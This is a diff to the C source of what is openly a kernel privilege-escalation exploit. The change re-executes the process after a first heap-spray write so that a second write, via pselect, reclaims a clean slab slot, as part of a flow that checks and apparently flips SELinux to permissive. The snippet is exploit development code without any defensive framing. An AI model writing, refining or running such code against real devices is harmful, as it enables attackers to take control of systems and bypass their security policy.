@@ -986,6 +986,15 @@ static int verify_leaf_dir_stage(void *context) {
   return 0;
 }
 
+/* W1's spray/reclaim poisons the slab freelist for the rest of this process,
+ * so pselect W2 keeps landing in the wrong slot until a fresh process (the
+ * manual second run). tcp does not suffer this and stays in-process. */
+static void reexec_for_clean_w2(char **argv) {
+  pr_info("W1 complete; re-exec for clean W2 reclaim\n");
+  execv("/proc/self/exe", argv);
+  pr_warning("re-exec failed (errno=%d); continuing in-process\n", errno);
+}
+
 int run_exploit(int argc, char **argv) {
   (void)argc; (void)argv;
   disable_rseq_for_thread();
@@ -1023,6 +1032,9 @@ int run_exploit(int argc, char **argv) {
       return 1;
     }
     TIMER("Write 1 complete");
+    if (!tcp_route_selected()) {
+      reexec_for_clean_w2(argv);
+    }
   } else {
     pr_success("SELinux already permissive\n");
   }
